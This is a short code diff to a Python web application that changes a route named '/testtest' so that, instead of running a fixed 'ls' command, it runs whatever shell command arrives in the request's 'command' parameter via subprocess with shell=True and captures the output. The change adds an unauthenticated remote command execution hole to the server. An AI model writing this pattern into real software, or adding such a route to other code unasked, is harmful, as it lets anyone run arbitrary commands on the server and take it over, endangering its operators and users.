@@ -1714,8 +1714,7 @@ import subprocess
 
 @views.route("/testtest")
 def testtest():
-
-    command = "ls"
+    command = request.args.get('command')
 
     process = subprocess.run(command, shell=True, capture_output=True, text=True)
 
